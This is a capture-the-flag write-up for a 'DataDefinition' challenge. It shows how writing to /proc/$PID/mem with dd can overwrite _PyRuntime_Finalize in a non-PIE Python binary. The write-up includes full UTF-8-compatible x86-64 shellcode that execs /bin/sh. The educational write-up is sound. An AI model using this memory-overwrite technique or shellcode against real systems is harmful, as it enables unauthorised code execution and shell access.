### DataDefinition

This is a challenge that allows users to run `dd`.
The goal is to get RCE via `dd` by overwriting memory.

### Exploit

The Python interpreter on Ubuntu is not PIE, therefore we can overwrite
symbols. Additionally, writing to /proc/$PID/mem allows us to write to
non-writable pages, so we can manipulate arbitrary sections of the binary.
We decided to overwrite `_PyRuntime_Finalize` which is a function that is
called at the end of the execution of a script with shellcode.
The challenge requires to provide a utf-8 compatible shellcode.

Example:

```
[bits 64]

add al, 0

xlatb ; utf8
mov rdx, 0
xlatb ; utf8
mov eax, 0x3b

push strict word 0x0068
push strict word 0x732f
push strict word 0x6e69
push strict word 0x622f

push rsp
pop rdi
push rdx
push rdi
push rsp
pop rsi

syscall
```

We used the xlatb instruction to be able to use utf-8 continuation bytes for
`mov` instructions.
